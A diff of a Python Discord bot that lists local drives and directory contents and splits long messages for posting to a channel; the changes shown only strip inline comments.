@@ -10,8 +10,8 @@ def list_drives():
                 drive = f"{letter}:\\"
                 if os.path.exists(drive):
                     total, used, free = shutil.disk_usage(drive)
-                    total_gb = total / (1024 ** 3)  # Convert bytes to GB
-                    free_gb = free / (1024 ** 3)    # Convert bytes to GB
+                    total_gb = total / (1024 ** 3)
+                    free_gb = free / (1024 ** 3)
                     drives.append(f"💿 **{drive}\**  `{free_gb:.1f}GB free / {total_gb:.1f}GB total`")
         return drives
     except Exception as e:
@@ -26,7 +26,6 @@ def format_file_size(size_in_bytes):
 async def send_large_message(channel, message, delay=3):
     parts = []
     while len(message) > 2000:
-        # Find the last space before the 2000th character to avoid splitting in the middle of a word
         split_index = message[:2000].rfind(" ")
         if split_index == -1:
             split_index = 2000  # If no space is found, just split at 2000
@@ -34,9 +33,8 @@ async def send_large_message(channel, message, delay=3):
         parts.append(message[:split_index])
         message = message[split_index:]
 
-    parts.append(message)  # Add the remaining part of the message
+    parts.append(message)
 
-    # Send each part with a delay
     for part in parts:
         await channel.send(part)
         await asyncio.sleep(delay)
@@ -65,7 +63,6 @@ async def list_directory_contents(bot, CHANNEL_ID, current_dir=None):
 
         channel = bot.get_channel(CHANNEL_ID)
 
-        # Send message with a 3-second delay if message is too large
         if len(message) > 2000:
             await send_large_message(channel, message, delay=3)
         else:
